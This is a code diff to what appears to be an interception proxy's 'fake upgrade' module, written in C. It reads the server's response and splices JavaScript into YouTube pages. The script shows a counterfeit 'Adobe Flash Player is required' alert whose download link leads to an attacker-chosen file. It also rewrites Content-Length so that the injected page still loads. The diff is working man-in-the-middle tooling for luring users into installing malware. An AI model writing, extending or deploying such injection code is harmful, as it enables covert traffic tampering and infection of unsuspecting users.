@@ -18,16 +18,17 @@
 #include <bio_replacer.h>
 #include <bio_injector.h>
 
+extern int fix_content_lenght(char *header, int len);
 /* globals */
 
 
 /* protos */
 
-int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file, char *tag, char *host);
+int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file, char *tag, char *host);
 
 /************************************************/
 
-int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *host)
+int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char *tag, char *host)
 {
    int written, len;
    BIO *fbio = NULL;
@@ -52,15 +53,16 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *hos
       }
 
       DEBUG_MSG(D_INFO, "Connection html to [%s]", host);
-      sanitize_header(http_header);
+      sanitize_header(request);
 
-      DEBUG_MSG(D_EXCESSIVE, "header: [%s]", http_header);
+      DEBUG_MSG(D_EXCESSIVE, "header: [%s]", request);
 
-      BIO_puts(*sbio, http_header);
+      BIO_puts(*sbio, request);
 
       written = 0;
       SAFE_CALLOC(data, READ_BUFF_SIZE, sizeof(char));
 
+      DEBUG_MSG(D_INFO, "Reading response");
       LOOP {
          len = BIO_read(*sbio, data + written, sizeof(char));
          if (len <= 0)
@@ -70,8 +72,10 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *hos
          if (strstr(data, CR LF CR LF) || strstr(data, LF LF))
             break;
       }
+      DEBUG_MSG(D_INFO, "Got Header");
 
       if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
+         DEBUG_MSG(D_INFO, "Substituting video frame...");
       
          char *html_to_inject1 = "document.getElementById('watch-player').innerHTML = \"<div class='yt-alert yt-alert-default yt-alert-error  yt-alert-player'><div class='yt-alert-icon'><img src='//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif' class='icon master-sprite' alt='Alert icon'></div><div class='yt-alert-buttons'></div><div class='yt-alert-content' role='alert'><span class='yt-alert-vertical-trick'></span><div class='yt-alert-message'>The Adobe Flash Player is required for video playback. <br> <a target='blank' href='/";
          char *html_to_inject2 = "'>Get the latest Flash Player</a> <br></div></div></div>\";";
@@ -105,6 +109,19 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *file,  char *tag, char *hos
          fbio = BIO_new(BIO_f_null());
          inject_len = 0;
       }
+
+      *cbio = BIO_push(fbio, *cbio);
+      if (strstr(data, ": gzip")) {
+         DEBUG_MSG(D_ERROR, "ERROR: GZIP compression detected, cannot attack !!");
+      }
+
+      int data_len = fix_content_lenght(data, inject_len);
+      DEBUG_MSG(D_EXCESSIVE, "data: [%s]", data);
+
+      BIO_write(*cbio, data, data_len);
+      SAFE_FREE(data);
+
+      return ESUCCESS;
    } else {
       /* calculate and replace the IPA_URL in the file */
       snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);
